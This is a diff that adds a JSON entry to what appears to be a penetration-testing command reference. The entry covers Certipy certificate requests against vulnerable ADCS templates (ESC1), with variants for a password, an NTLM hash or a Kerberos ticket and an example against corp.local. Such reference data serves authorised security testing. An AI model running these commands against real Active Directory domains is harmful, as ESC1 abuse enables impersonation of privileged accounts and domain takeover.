@@ -1,0 +1,35 @@
+{
+  "id": "certipy-req",
+  "name": "Certipy Request Certificate",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca '<ca_name>' -template '<template>'",
+  "description": "Request a certificate from a vulnerable ADCS template",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "certipy",
+    "adcs",
+    "certificate",
+    "esc1",
+    "request"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "certipy req -u '<user>@<domain>' -hashes ':<hash>' -dc-ip <ip> -ca '<ca_name>' -template '<template>'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "certipy req -u '<user>@<domain>' -k -no-pass -dc-ip <ip> -ca '<ca_name>' -template '<template>'"
+    }
+  ],
+  "examples": [
+    "certipy req -u 'user@corp.local' -p 'password' -dc-ip 192.168.1.100 -ca 'CORP-CA' -template 'VulnTemplate'"
+  ]
+}
